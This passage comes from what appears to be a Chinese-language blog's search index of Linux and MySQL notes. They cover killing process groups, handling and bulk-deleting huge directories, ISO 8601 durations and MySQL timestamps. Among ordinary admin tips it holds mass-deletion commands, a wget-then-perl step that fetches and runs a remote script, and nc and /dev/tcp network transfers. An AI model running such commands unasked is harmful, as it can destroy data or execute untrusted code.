Overflow](https://stackoverflow.com/questions/20548460/timeout-command-not-found-in-linux-server)\n\n### kill -2 就使 Ctrl + c\n\n這一樣子程序都會被 kill 掉\n\n### nohup意思\n\n#### 有關 nohup\nnohup 的全寫是 “no hangup”, HUP hangup (HUP) 訊號會在使用者登出時, 系統向 process 發出, 通知 process 結束, 但透過 nohup 執行的指令, nohup 會將 HUP 訊息截取, 讓指令可以繼續執行。\n[nohup 指令 - 背景執行指令](https://www.opencli.com/linux/nohup-background-execute-command)\n\n掛起信號【hang up】，終端斷線，經常在退出系統前使用，會終止進程。但是，一般啟動程序時為了讓程序繼續運行，會指定 nohup 就是為了不讓程序接收掛起信號而終止，這樣在退出系統時程序仍舊能正常運行\n[Linux 之 kill 命令入門實踐 | 蝦丸派](https://www.playpi.org/2019042101.html)\n\n參考連結:\n[Ways to kill parent and child processes in one command - Fibrevillage](http://fibrevillage.com/sysadmin/237-ways-to-kill-parent-and-child-processes-in-one-command)\n[Linux 中 Kill -2 和 Kill -9 的区别 - Harry的专栏 - CSDN博客](https://blog.csdn.net/Harry_lyc/article/details/53543928)\n[Linux中kill -2、kill -9等区别 && kill signal汇总 - 天涯的浪子 - CSDN博客](https://blog.csdn.net/a1010256340/article/details/75253353)\n[Linux 之 kill 命令入门实践 | 虾丸派](https://www.playpi.org/2019042101.html)\n[Linux kill -9 和 kill -15 的区别 - 妖老山黑 - 博客园](https://www.cnblogs.com/liuhouhou/p/5400540.html)\n[process - ps switches to display PID, PPID, PGID, and SID collectively - Unix & Linux Stack Exchange](https://unix.stackexchange.com/questions/82724/ps-switches-to-display-pid-ppid-pgid-and-sid-collectively)\n[kill -HUP pid - 小菜鸟的天地 - CSDN博客](https://blog.csdn.net/zhuying_linux/article/details/7031573)\n[Linux命令——timeout - 夏天的风 - CSDN博客](https://blog.csdn.net/xiaqunfeng123/article/details/54315390)\n[Running php script as cron job - timeout issues? - Stack Overflow](https://stackoverflow.com/questions/13352388/running-php-script-as-cron-job-timeout-issues)","tags":["kill"],"categories":["Linux"]},{"title":"如何在 Linux 殺掉(kill)子程序","url":"%2Fblog%2F2019%2F10%2F03%2F%E5%A6%82%E4%BD%95%E5%9C%A8-Linux-%E6%AE%BA%E6%8E%89-kill-%E5%AD%90%E7%A8%8B%E5%BA%8F%2F","content":"\n最近有排程卡住\nMIS 殺掉(kill)程式，發現他的子程序還在跑\n我們都以為 kill 掉父程序就可以關掉子程序\n今天實驗出來是不能的\n\n2021 沒想到這篇 Google 還滿容易搜尋到\n當初只是操作筆記，簡單紀錄\n不過有部分寫錯，把多餘錯誤份刪掉\n留下重點...避免其他人吸收錯誤知識\n\n<!--more-->\n\n## 什麼是子程序\n\n可以先去鳥哥那邊了解子程序運作原理\n簡單說目前看到有兩種\n\n1. 父程序呼叫子程序，父程序會掛起(類似stop)，不會做任何動作，等子程序跑完才會往下執行\nPS: 剛好最近了解阻塞跟非阻塞，這應該就是`阻塞`\n\n2. fork and exec：程序呼叫的流程(可參考:[鳥哥的 Linux 私房菜 -- 第十六章、程序管理與 SELinux 初探](http://linux.vbird.org/linux_basic/0440processcontrol.php)，我目前還沒深入研究)\n\n\n## kill 父程序實驗\n\n**只要在 kill -$PGID**\n**只要在 kill -$PGID**\n**只要在 kill -$PGID**\n\n`kill -$PID`\n其實下面我之前引用英文文章有寫到\n\n\n這邊我之前測試，使用 Ctrl + C 想說就是 `kill -2 xxx`\n但我阿現實作跟 kill 有差異`，我測試結果子程序會刪除\n這邊就不深入探討了...\n[Linux ctrl-c explained(ctrl-c 详解) - SegmentFault 思否](https://segmentfault.com/a/1190000018369650)\n\n\n\n**2019-10-05**\n原來我誤會了\n其實 kill 也能殺掉`子程序`\n在研究 timeout 指令，實驗子程序狀況發現子程序也會關掉\n這又是另外一個事情了\n\n推薦使用下面第二點方法去 kill 掉\n```bash\n# 下面兩個寫法一樣\n# 另外 $PGID 可解讀就是父層可以被 PID\nkill -- -$PGID\nkill -15 -$PGID\n# 當然也可以強制關閉\nkill -9 -$PGID\n```\n\nPGID 也可以用 ps 指令去查\n[process - ps switches to display PID, PPID, PGID, and SID collectively - Unix & Linux Stack Exchange](https://unix.stackexchange.com/questions/82724/ps-switches-to-display-pid-ppid-pgid-and-sid-collectively)\n\n**2020-11-26**\n最近用碰觸 kill\n忘記一般 kill 要加負號才能刪掉子程序\n\n最近也在探討 nohup 和 & 也能不能做尋組刪除\n答案是可以的\n\n可以參考: [[譯] 如何殺死一個進程和它的所有子進程](https://juejin.cn/post/6844903927989665806?utm_campaign=devtool.com&utm_medium=devtool.com&utm_medium=devtool.com&utm_source=devtool.com%3Futm_campaign%3Ddevtool.com&utm_source=devtool.com) {% asset_link web1.png 備份圖 %}\n\n最近想做一個守護進程...\n再研究...\n\n參考連結:\n\n> 1.kill a group of processes with negative PID(Process ID)\n> \n> kill  -TERM -PID\n> \n> Is to kill PID and all its child processes.\n> 2. kill a group of processes with their PGID(Process Group ID)\n> \n> kill -- -$PGID   Kill using the default signal (TERM = 15)\n> kill -9 -$PGID   Kill using the KILL signal (9)\n> \n> 3. kill a group processes with only PID info\n> \n> kill -- -$(ps -o pgid= $PID | grep -o [0-9]*)\n> \n> Actually, you may notice that it's just the way from #2\n> 4.Using pkill, kill processes by PGID(Proess Group ID)\n> \n> pkill -9 -g $PGID\n> \n> 5.Using pkill, kill processes by GID(Group ID)\n> \n> pkill -9 -G $GID\n> \n> 6.Using pkill, kill processes by PPID(Parent Process ID)\n> \n> pkill -9 -p $PPID\n> \n> 7.Using pkill, kill processes by terminal\n> \n> pkill -9 -t $terminal\n> \n> Note: without /dev/ prefix\n> 8.Using pkill, kill processes by process name\n> \n> pkill -9 -x $process_name\n> \n> 9.Using pkill, kill processes by session\n> \n> pkill -9 -s $sess\n> \n> How to get PID,PGID,sessionid etc?\n> ```\n> # ps -o pid,ppid,pgid,gid,sess,cmd -U root\n>   PID  PPID  PGID   GID  SESS CMD\n> ```\n \n* [Ways to kill parent and child processes in one command - Fibrevillage](http://fibrevillage.com/sysadmin/237-ways-to-kill-parent-and-child-processes-in-one-command)\n* [鳥哥的 Linux 私房菜 -- 第十六章、程序管理與 SELinux 初探](http://linux.vbird.org/linux_basic/0440processcontrol.php#ps)\n* [linux - Best way to kill the all child processes in Linux - By Microsoft Award MVP - ubuntu - red hat - debian - linux server - linux pc - Learn in 30sec | wikitechy](https://www.wikitechy.com/tutorials/linux/best-way-to-kill-all-child-processes-in-linux)\n* [（三）进程各种id：pid、pgid、sid、全局pid、局部pid - win9 - CSDN博客](https://blog.csdn.net/qq_33160790/article/details/81346663)\n* [阿旺的 Linux 開竅手冊-process 進程(行程/程序)](http://www.polish.url.tw/ach8/ach8.html#pgid)\n* [process - Kill all descendant processes - Unix & Linux Stack Exchange](https://unix.stackexchange.com/questions/124127/kill-all-descendant-processes)\n* [阿旺的 Linux 開竅手冊-process 進程(行程/程序)](http://www.polish.url.tw/ach8/ach8.html#kill)\n* [子进程及时知道父进程已经退出的最简单方案 - 横云断岭的专栏 - CSDN博客](https://blog.csdn.net/hengyunabc/article/details/5921749)","tags":["pkill"],"categories":["Linux"]},{"title":"用 Markdown 畫循序圖小記","url":"%2Fblog%2F2019%2F10%2F01%2F%E7%94%A8-Markdown-%E7%95%AB%E5%BE%AA%E5%BA%8F%E5%9C%96%E5%B0%8F%E8%A8%98%2F","content":"\n小記我常忘 markdown 循序圖\n\n<!--more-->\n\n循序圖\n\n```sequence\n战士->领导: 首长好\nNote right of 领导: 首长复杂的内心活动\n领导-->战士: 同志们好\n战士->>领导: 为人民服务\n```\n\n```js\n對象箭頭標識符：\n    ->: 表示實線實箭頭 (同步)\n    -->: 表示虛線實箭頭 兩個--回復\n    ->>: 表示實線虛箭頭(非同步)\n    -->>：表示虛線虛箭頭\n```\n\n[【UML 建模】UML入门 之 交互图 -- 时序图 协作图详解 - 让 学习 成为一种 习惯 ( 韩曙亮 の 技术博客 ) - CSDN博客](https://blog.csdn.net/shulianghan/article/details/17927131)\n[Markdown 時序圖/序列圖 - 開發者目錄](https://www.rdtoc.com/tutorial/markdown-js-sequence-tutorial.html)\n[UML 图中的消息](https://www.ibm.com/support/knowledgecenter/zh/SS4JE2_7.5.5/com.ibm.xtools.sequence.doc/topics/cmsg_v.html)\n\n`-->` 程式返回值使用，如上面範例\n","tags":["markdown"],"categories":["Markdown"]},{"title":"ISO 8601 duration 時間標準小記","url":"%2Fblog%2F2019%2F10%2F01%2FISO-8601-duration-%E6%99%82%E9%96%93%E6%A8%99%E6%BA%96%E5%B0%8F%E8%A8%98%2F","content":"\n最近發現串接的 API 有這種格式`\"P3Y6M4DT12H30M5S\"`\n第一次看到這種好奇是什麼東西\n發現是一個標準格式 **ISO 8601 duration**\n\n<!--more-->\n\n```\nPnYnMnDTnHnMnS\nPnW\nP<date>T<time>\n```\n\n> \"P3Y6M4DT12H30M5S\" 就表示 \"3年6個月4天12小時又30分5秒\"，\n\n看這麼一連串字，覺得很難看到\n但其實舊時一個英文搭配數字組合方式\n\n## 現成 Library\n\n### momentjs\n\n[Moment.js | Docs](https://momentjs.com/docs/#/durations/)\n\n```javascript\nmoment.duration('P3Y6M4DT12H30M5S','minutes').toString();\n\"P3Y6M4DT12H30M5S\"\nmoment.duration('P3Y6M4DT12H30M5S','minutes').humanize()\n\"4 years\"\nmoment.duration('P3Y6M4DT12H30M5S','minutes').minutes()\n30\nmoment.duration('P3Y6M4DT12H30M5S','minutes').as('hours')\n30780.50138888889\nmoment.duration('P3Y6M4DT12H30M5S','minutes').toISOString()\n\"P3Y6M4DT12H30M5S\"\n```\n\n[Duration missing features · Issue #463 · moment/moment](https://github.com/moment/moment/issues/463)\n\n#### 換成好看的時間\n\n```javascript\nmoment.utc(moment.duration('P3Y6M4DT12H30M5S').asMilliseconds()).format(\"HH:mm\");\n```\n\n[Format a moment duration as Hours and Minutes · TCS Blog](https://blog.tcs.de/format-a-moment-duration-as-hours-and-minutes/)\n\n### Java\n\n\njava.time.Duration\n\n[生活記事簿: Parse ISO 8601 duration 的方法](http://hklifenote.blogspot.com/2016/03/parse-iso-8601-duration.html)\n\n\n### PHP\n\n[PHP: DateInterval::__construct - Manual](https://www.php.net/manual/en/dateinterval.construct.php)\n\n```php\n<?php\n\n$interval = new DateInterval('P2Y4DT6H8M');\nvar_dump($interval);\n```\n\n[PHP: DateInterval::format - Manual](https://www.php.net/manual/en/dateinterval.format.php)\n\n\n另外 DB 要怎麼紀錄這種資料呢?\n[What MySQL datatype to store a PHP DateInterval - Stack Overflow](https://stackoverflow.com/questions/42837852/what-mysql-datatype-to-store-a-php-dateinterval)\n這邊裡面有提到用 varchar\n但我覺得存 int 會比較好\n\n先記錄到這邊，有發現好用的在紀錄","tags":["duration"],"categories":["程式心法"]},{"title":"Linux ls 大量檔案卡住解決方法","url":"%2Fblog%2F2019%2F09%2F27%2FLinux-ls-%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E5%8D%A1%E4%BD%8F%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95%2F","content":"\n今天在大量檔案資料夾(約19萬個檔案)\n下 command line 下 ls 之後就卡住\n不能用 `Ctrl + C` 跳出去...\n\n<!--more-->\n\n在想有什麼方法解決這個問題?\n\n## ls -1 -f\n\n**注意這邊 -1 是數字1，不是英文小寫L**\n查看了一下 `-f` 就是不做排序，`-1`是做一欄輸出\n\n[Linux下文件过多过碎问题 – 工作笔记](http://www.zxzblog.com/linux-morefile/)\n\n## 刪除多個檔案\n\n雖然我沒有現在要做，不過都看到方法，順便記錄一下。\n\n### strace\n\n這篇用[非常大的文件夹导致ls命令卡住](https://beyondkmp.github.io/%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/ls%E5%91%BD%E4%BB%A4%E5%8D%A1%E4%BD%8F.html) strace 方法\n\n```bash\nls -l >/dev/null\nstrace -p 3963 2>&1 | grep lstat\n\n# lstat64(“xxxxx”, {st_mode=S_IFREG|0664, st_size=0, …}) = 0\n```\n\n[Linux 删除海量文件 rm -f 会卡死怎么破？ - OSCHINA](https://www.oschina.net/question/255612_220479)\n\n### rsync --delete-before\n\n```bash\nrsync –delete-before -d -a –progress –stats /a/ /data/\n```\n[Linux下文件过多过碎问题 – 工作笔记](http://www.zxzblog.com/linux-morefile/)\n[还是Linux删除海量文件的问题，那些说用rsync --delete-before完全没用 - OSCHINA](https://www.oschina.net/question/255612_221510)\n\n\n### 別人多個測試結果\n\n> http://www.slashroot.in/which-is-the-fastest-method-to-delete-files-in-linux\n> 刪除50萬個文件,各種方法的速度對比:\n> \n> 先創建50萬個文件:\n> for i in $(seq 1 500000); do echo testing >> $i.txt; done\n> \n> 各種刪除當前目錄文件方法,先進入該目錄(比如PHP的sessions目錄),然後執行以下命令:\n> time rm -f * 刪除失敗,返回 /bin/rm: Argument list too long\n> time find ./ -type f -exec rm {} \\;\n> time find ./ -type f -delete\n> time rsync -a --delete EmptyDir/ BigDir/\n> time perl -e 'for(<*>){((stat)9<(unlink))}'\n> \n> 結果:\n> perl用了1分鐘\n> rsync用了3分鐘\n> find with -delete用了5分鐘\n> find with -exec用了14分鐘\n> 直接用rm結果是刪除失敗. \n\n### 實測\n\n```bash\n# 建立 500000 測試文件\nfor i in $(seq 1 500000); do echo testing >> $i.txt; done\n\nfind /test -type f -exec rm {} \\;\nfind /test -mtime +7 -exec rm {} \\;\nfind /test -size +7M -exec rm {} \\;\n\ntime rm -f * #/bin/rm: Argument list too long\ntime find ./ -type f -exec rm {} \\;      #real    14m51.735s\ntime find ./ -type f -delete     # real    5m11.937s\ntime perl -e 'for(<*>){((stat)[9]<(unlink))}'   # real    1m0.488s (王者)\ntime rsync -a --delete blanktest/ test/   # real    2m52.502s\n```\n\n測試 Perl 真的很快，不知道是用甚麼巫術。\n\n推薦詳細可以看[Rsync同步时删除多余文件 [附：删除大量文件方法的效率对比] - 散尽浮华 - 博客园](https://www.cnblogs.com/kevingrace/p/5766139.html) {% asset_link web1.png 備份圖 %}\n裡面介紹很詳細\n\n```bash\n# #1 刪除某資料夾檔案\n#1）建立一個空的文件夾：\n# mkdir /tmp/test\n#2）用rsync刪除目標目錄：\n# rsync --delete-before -a -H -v --progress --stats /tmp/test/ log/\n這樣要刪除的log目錄就會被清空了，刪除的速度會非常快。rsync實際上用的是替換原理，處理數十萬個文件也是秒刪。\n\n# #2 刪除某資料夾檔案\n# 搬移後刪除\nrsync -a --remove-source-files SOURCEDIR /mnt/TARGETDIR/\n```\n\n[Linux 刪除海量文件 rm -f 會卡死怎麼破？ - OSCHINA](https://www.oschina.net/question/255612_220479)\n\n## 大量檔案複製\n\n> 3、小文件太多，複製太慢\n> 　　1，在需要對大量小文件進行移動或複製時，用cp、mv都會顯得很沒有效率，可以用tar先壓縮再解壓縮的方式。\n> 　　2，在網絡環境中傳輸時，可以再結合nc命令，通過管道和tcp端口進行傳輸。\n> 　　nc和tar可以用來快速的在兩台機器之間傳輸文件和目錄，比ftp和scp要來得簡單的多。\n> 　　由於nc是一個超輕量的命令，所以一般busybox都會集成它。當一個linux終端，比如linux pda,\n> 　　通過usblan的方式連接到另一台linux主機的時候，這樣的嵌入式終端上一般不會集成ftp server, ssh server\n> 　　這樣比較笨重的服務，這個時候， nc可能成為唯一的上傳手段。\n> 　　比如將機器A上的test目錄上傳到到機器 B（192.168.0.11）上，只需要：\n> 　　在機器B上，用nc來監聽一個端口，隨便就好，只要不被佔用；並且將收到的數據用tar展開。-l代表監聽模式。\n> 　　#nc -l 4444 |tar -C /tmp/dir -zxf -\n> 　　然後，在A上通過nc和 tar發送test目錄。使用一致的4444的端口。\n> 　　#tar -zcvf - test|nc 192.168.0.11 4444\n\n[Linux下文件過多過碎問題 – 工作筆記](http://www.zxzblog.com/linux-morefile/)\n\n~~哪天用到再說...~~\n\n### 實測\n\n最近工作有座大量刪除檔案，在我還滿好奇使用這個速度會有多快?上面指令竟然無法使用!!!不過後來有找到類似指令，最後測試成功。\n參考: [Netcat（Linux nc 指令）網路管理者工具實用範例| 兩台主機之間複製整個目錄 - G. T. Wang](https://blog.gtwang.org/linux/linux-utility-netcat-examples/)\n\n下面操作要照順序\n\n在接收端電腦使用\n\n```bash\nnc -l 5000 | tar xvf -\n```\n\n在發送端電腦使用\n\n```bash\n# localhost 換成你的目地電腦\n# 前面可以加 time ，可以算時間\n# /path/to/dir 是要傳送檔案目錄\n# 5000 傳輸 port\ntar cvf - /path/to/dir | nc localhost 5000\n\n```\n\n相同電腦，執行速度\n\n```\nreal    4m43.463s\nuser    0m9.270s\nsys     0m47.256s\n```\n\n### zxvf 操作\n\n不會比較快，而且還會卡住...，但其實是完成的。\n\n\n\n\n## 大量看檔案數\n\n```bash\ntime perl -e 'opendir D, \".\"; @files = readdir D; closedir D; print scalar(@files).\"\\n\"' #1315029  real    0m0.580s user    0m0.302s sys     0m0.275s – \n```\n\n我這邊測試時間\n```\nreal    0m1.620s\nuser    0m0.101s\nsys     0m0.565s\n```\n\n使用`time ls -f | wc -l`時間好像更快\n\n```\nreal    0m0.397s\nuser    0m0.175s\nsys     0m0.250s\n```\n\n參考:\n- [shell - Fast Linux file count for a large number of files - Stack Overflow](https://stackoverflow.com/questions/1427032/fast-linux-file-count-for-a-large-number-of-files)\n- [PERL count files in a dir](https://www.unix.com/shell-programming-and-scripting/113891-perl-count-files-dir.html)\n\n## 找大量使用inode 資料夾\n\n```bash\nwget http://downinfo.myhostadmin.net/check_inode_counts.txt\nmv check_inode_counts.txt check_inode_counts.pl\nperl check_inode_counts.pl /\n```\n\ncheck_inode_counts.pl\n```perl\n#!/usr/bin/perl -w\nuse strict;\nmy $threshold=50000;\nmy ($count,$bigdir);\nsub count_inodes($);\nsub count_inodes($)\n{\n\tmy $dir=shift;\n\treturn if($count>=$threshold);\n\tif(opendir(my $dh,$dir))\n\t{\n\t\twhile(defined(my $file=readdir($dh)))\n\t\t{\n\t\t\tnext if ($file eq '.'||$file eq '..');\n\t\t\t$count++;\n\t\t\tmy $path=$dir.'/'.$file;\n\t\t\tcount_inodes($path) if (-d $path);\n\t\t}\n\t\tclosedir($dh);\n\t}else\n\t{\n\t\twarn \"couldn't open $dir - $!\\n\";\n\t}\n}\n\npush(@ARGV, '.') unless (@ARGV);\nwhile (@ARGV)\n{\n\tmy $main=shift;\n\t$main.='/' unless($main=~/\\/$/);\n\tif(opendir(my $dh, $main))\n\t{\n\t\twhile(defined(my $file=readdir($dh)))\n\t\t{\n\t\t\t$count=0;\n\t\t\tnext if($file eq '.'||$file eq '..'||! -d $main.$file);\n\t\t\tcount_inodes($main.$file);\n\t\t\t$count=\">\".$threshold if($count>=$threshold);\n\t\t\tprintf \"%10s\\t%s\\n\", $count, $main.$file;\n\t\t}\n\t\tclosedir($dh);\n\t}\n\telse\n\t{\n\t\twarn \"couldn't open $main - $!\\n\";\n\t}\n}\n\n```\n\n[linux系统磁盘block、inode占满处理 - 华为云](https://www.huaweicloud.com/articles/b989923796f37fb1736e0063f83b2c24.html)\n\n## 大量檔案看大小\n\n\n[command line - Fast way to display the size of each subdirectory in a directory - Unix & Linux Stack Exchange](https://unix.stackexchange.com/questions/307583/fast-way-to-display-the-size-of-each-subdirectory-in-a-directory)\n\n[One billion files on Linux [LWN.net]](https://lwn.net/Articles/400629/)\n\n[linux - Filesystem large number of files in a single directory - Server Fault](https://serverfault.com/questions/43133/filesystem-large-number-of-files-in-a-single-directory)\n\n[XFS vs EXT4 | 夏天的风的博客](http://xiaqunfeng.cc/2017/07/06/XFS-vs-EXT4/)\n\n\n","tags":["ls"],"categories":["Linux"]},{"title":"MySql Lock wait timeout exceeded 小記","url":"%2Fblog%2F2019%2F09%2F24%2FMySql-Lock-wait-timeout-exceeded%E5%B0%8F%E8%A8%98%2F","content":"\n今天在 log 發現有少數 SQL 會 MySql Lock wait timeout exceeded\n網路找幾天文章，先暫時放著\n\n[MySql Lock wait timeout exceeded该如何处理？ | 凝雨 - Yun | 快乐编程每一天 - Happy Coding Every Days](https://ningyu1.github.io/blog/20180408/75-mysql-lock-wait-timeout-exceeded.html)\n[[心得] 高併發伺服器設定 « Huli's Blog](http://huli.logdown.com/posts/542398-high-connection-setting)\n[谈谈MySQL的锁 - 蹲厕所的熊](https://benjaminwhx.com/2018/04/27/%E8%B0%88%E8%B0%88MySQL%E7%9A%84%E9%94%81/)\n[在laravel上處理高併發問題 - ScottChayaa](https://blog.scottchayaa.com/post/2019/01/09/how-to-handle-the-high-concurrency-on-laravel/)\n> mysql transaction default timeout is 50 sec => my suggestion is between 3 ~ 5 sec\n我同事也是建議不要設長\n\n[MySQL insert into ... select 的锁情况 【转】 - 大树叶 技术专栏 - CSDN博客](https://blog.csdn.net/bigtree_3721/article/details/73277419)\n[MySQL InnoDB 锁等待和锁等待超时的处理 - 简书](https://www.jianshu.com/p/4bf87a2f83ae)\n[資料庫交易的 Isolation - getamis - Medium](https://medium.com/getamis/database-transaction-isolation-a1e448a7736e)\n[對於 MySQL Repeatable Read Isolation 常見的三個誤解 - Chester Chu - Medium](https://medium.com/@chester.yw.chu/%E5%B0%8D%E6%96%BC-mysql-repeatable-read-isolation-%E5%B8%B8%E8%A6%8B%E7%9A%84%E4%B8%89%E5%80%8B%E8%AA%A4%E8%A7%A3-7a9afbac65af)\n[[SQL]建立Index來避免DeadLock | 亂馬客 - 點部落](https://dotblogs.com.tw/rainmaker/2014/05/28/145284)\n[insert into a select * from b 锁问题分析 | 没有伞的孩子必须努力奔跑](http://www.xuchanggang.cn/archives/1188.html)\n","tags":["mysql"],"categories":["MySQL"]},{"title":"Linux 指令搜尋多個檔案內容","url":"%2Fblog%2F2019%2F09%2F23%2FLinux-%E6%8C%87%E4%BB%A4%E6%90%9C%E5%B0%8B%E5%A4%9A%E5%80%8B%E6%AA%94%E6%A1%88%E5%85%A7%E5%AE%B9%2F","content":"\n最近需要做搜尋多個檔案\n但又不想把每一個檔案都抓下來\n有網路找幾個方法，做個筆記\n\n\n<!--more-->\n\n## Linux 指令方法\n\n```bash\nfind \"path name\" -name \"file name\" -exec grep -H \"search content\" {} \\;\n```\n[Linux搜尋資料夾下的檔案內文：find+grep指令產生器 / Search the Content of Files on Linux: find + grep Command Builder - 布丁布丁吃什麼？](http://blog.pulipuli.info/2017/03/linuxfindgrep-search-content-of-files.html)\n[Falldog的程式戰場: [Linux] 搜尋資料夾底下 檔案內部文字](http://falldog7.blogspot.com/2008/01/linux.html)\n\n這個指令不是很快(不知道是不是真的資料太多啦XD)\n主機指令不想安裝太複雜的程式\n所以我就沒試了\n\n## 其他工具\n\n[4ndrew/filesearcher: File Search experiments](https://github.com/4ndrew/filesearcher)\n[danielgatis/search_in_files: This is a tool for search text in files](https://github.com/danielgatis/search_in_files)\n\n\n快速找檔案，但沒有找內容\n[vishaltelangre/ff: Find files (ff) by name, fast!](https://github.com/vishaltelangre/ff)\nfzf 也能做到\n[Make fzf installable by using `go get` · Issue #801 · junegunn/fzf](https://github.com/junegunn/fzf/issues/801)","tags":["grep"],"categories":["實用工具"]},{"title":"MySQL 我對 timestamp 多年的誤解","url":"%2Fblog%2F2019%2F09%2F23%2FMySQL-%E6%88%91%E5%B0%8D-timestamp-%E5%A4%9A%E5%B9%B4%E7%9A%84%E8%AA%A4%E8%A7%A3%2F","content":"\n以前實作上我都使用 datetime \n沒有選過用 timestamp\n今天我在找程式問題\n後來發現我多年對 timestamp 多年誤解\n\n<!--more-->\n\n公司使用 int(10) 當 timestamp\n所以我常常在 phpmyadmin 看到數值的東西\n\n最近，剛好跟別的公司合作\n剛好有一個資料表設計是 timestamp\n由於我在 phpmyadmin 看到 時間格式資料，我以為是 datetime 格式\n但我跟另外一個資料表裡面用 `datetime`\n想說時間怎麼對不起來...\n\n後來發現是 timestamp 是使用 unixtime 時間...(這個我知道)\n我以為 timestamp 是用數字\n**現在我知道他也是放`時間格式`**\n**現在我知道他也是放`時間格式`**\n**現在我知道他也是放`時間格式`**\n\n\n\n另外我實驗這種也能順利存到 DB 去\n```\nINSERT INTO test(ts) values(19900101000000);\n```\n\n當然這個時間格式會隨著`@@session.time_zone` 做改變\n\n```\nset @@session.time_zone = '+08:00';\nselect * from test;\n```\n\n難怪，之前合作公司說 DB 記得要用 UTC 時間\n因為這個主機上面有很多人在用，為了方便時間亂掉\n不過使用 timestamp 方式相信做多國跨域網站真的會比較方便!!","tags":["mysql"],"categories":["MySQL"]},{"title":"swoole 需要學習前了解一些東西整理小記","url":"%2Fblog%2F2019%2F09%2F20%2Fswoole-%E9%9C%80%E8%A6%81%E5%AD%B8%E7%BF%92%E5%89%8D%E4%BA%86%E8%A7%A3%E4%B8%80%E4%BA%9B%E6%9D%B1%E8%A5%BF%E6%95%B4%E7%90%86%E5%B0%8F%E8%A8%98%2F","content":"\n最近~~一時衝動~~報名 swoole 課程\n我對高併發實作還滿感興趣\n好奇怎麼運用一些方法解決\n今天看了 [學習Swoole需要掌握哪些基礎知識-Swoole-Swoole文檔中心](https://wiki.swoole.com/wiki/page/487.html) 發現裡面很多名詞不會\n不想浪費錢，趕快臨時抱佛腳\n\n<!--more-->\n\n本篇是我找來資訊，看到的內容打成自己的感想，所以也不是很正確的東西，反正是我自己筆記!!\n\n## 多進程/多線程\n\n多年來有看到執行緒跟多程序執行的差別，今天終於可以好好的想一下\n\n### 程序 與 執行緒差別\n\n其實很久以前有想這個問題，但一直沒有找解答\n我有想出兩個差別，可以共用全域變數，另外一個不行\n今天我又有更多想法，多程序吃的記憶體資源會比多執行緒吃的多\n畢竟1個 electron 跟開 1000 個 electron 是有差的...\n但我看到還有一個答案，就是多執行緒可以等待結束在進行下一個動作\n\n詳細可看[Program/Process/Thread 差異 - Po-Ching Liu - Medium](https://medium.com/@totoroLiu/program-process-thread-%E5%B7%AE%E7%95%B0-4a360c7345e5)\n\n#### fork 子程序\n\n前陣子看了鳥哥[鳥哥的 Linux 私房菜 -- 第十六章、程序管理與 SELinux 初探](http://linux.vbird.org/linux_basic/0440processcontrol.php#parent_pid)這篇\n看不太懂 `fork and exec：程序呼叫的流程`\n上課講到用 PHP 寫子程序\n\n```php\n<?php\n$pid = pcntl_fork(); //在這裡開始產生程式的分岔   ##**\nif ($pid == -1) {\n     die('無法產生子程序');\n} else if ($pid) {\n     // 父程序會進入這裡\n} else {\n     // 子程序會進入這裡\n}\n```\n做到上面`##**` 註解這行\n它會做fork 主程序，也就是複製整份主程序記憶體所有程式內容\n複製出來並不會跟主程序做關聯(會獨立出來)\n變數更動不影響別的子程序和父程序\n\n但沒法用一般 kill 指令調\n一般正常可以\n\n\n[PHP: posix_setsid - Manual](https://www.php.net/manual/en/function.posix-setsid.php)\n\n### 瞭解進程間通信的基本知識，如管道、UnixSocket、消息隊列、共享內存\n\n這個我就沒特別找了\n- [TCP/UDP的接收緩衝區和發送緩衝區 - Swallow_he的博客 - CSDN博客](https://blog.csdn.net/Swallow_he/article/details/84392285)\n- [一個故事告訴你什麼是消息隊列 · jasonGeng88/blog](https://github.com/jasonGeng88/blog/blob/master/201705/MQ.md)\n- [进程间的通信方式（一）：共享内存 - 知乎](https://zhuanlan.zhihu.com/p/37808566)\n## SOCKET\n\n> 瞭解SOCKET的基本操作如accept/connect、send/recv、close、listen、bind\n> 瞭解SOCKET的接收緩存區、發送緩存區、阻塞/非阻塞、超時等概念\n\n之前我有在 Java 書看到使用 socket 搭配執行緒做連線溝通\n但沒有深入了解裡面原理\n\n> 你一直聽到人家在講 \"sockets\"，你可能也想知道這些是什麼東西。\n> 好的，其實它們就是：＂利用標準 UNIX file descriptors（檔案描述符）與其它程式溝通的一種方式＂。\n[02-何謂 Socket - Beej's Guide to Network Programming 正體中文版](http://beej-zhtw.netdpi.net/02-what-is-socket)\n\n### file descriptors(fd)\n\n這邊有講到 `file descriptors` (fd) 後面會講到這個\n簡單說 就是 0 標準輸出(stdout) 1 標準輸入(stdin) 2 標準錯誤(stderr)\n\n一些重要的I/O導向:\n\n> \\>      重新導向並且先把檔案虧空(我真是敗家子:-))\n> \\>>     把結果導向並且append到檔案後\n> <      重新導向standard input\n> \\>&n    把standard out丟給file descriptor n\n> <&n    從file descriptor n拿東西給standard in\n> \\>&-    close standard out\n> \\<\\<\\text 把stanadard in導向，直到讀到text為止。\n\n\n[File descriptor與I/O導向 @ 程式專欄 :: 隨意窩 Xuite日誌](https://blog.xuite.net/tzeng015/twblog/113272117-File+descriptor%E8%88%87I%2FO%E5%B0%8E%E5%90%91)\n\nfd更狂的應用可以看[阿旺的 Linux 開竅手冊-file descriptor](http://www.polish.url.tw/ech2/ech2.html)\n我都不知道`/proc/xxxx/fd`可以看到所有應用程式 stdin / stdout / stderr 檔案\n\n```bash\n# 取得cmd 的 PID\necho $$;\ncd /proc/$$/fd/\nls -la\n```\n可以看到標準輸入輸出會寫在哪裡\n當然裡還還有更多東西，目前先提到這樣\n\n突然想到當初大學上 Linux 時候，老師講 Linux 裡面的東西都可以在檔案找到\n\n\n[回憶の隨筆日記: 檔案描述符 (file descriptor) 簡單應用分析](http://inspire-future.blogspot.com/2016/12/file-descriptor.html)\n\n[Socket-IO复用技术-SherryX-51CTO博客](https://blog.51cto.com/13097817/2054397)\n[檔案描述符 - 維基百科，自由的百科全書](https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6)\n\n### socket 跟 fd 關係? \n\n其實我以前看 socket 是傳訊息用的，想說他怎麼會跟 fd 有關係\n\n#### bash 可以用 socket\n\n```sh\n# 開啟連線至 Google 網頁的 socket\nexec 3<>/dev/tcp/www.google.com.tw/80\n\n# 送出 HTTP 請求\necho -e \"GET / HTTP/1.1\\n\\n\" >&3\n\n# 接收網頁內容，1 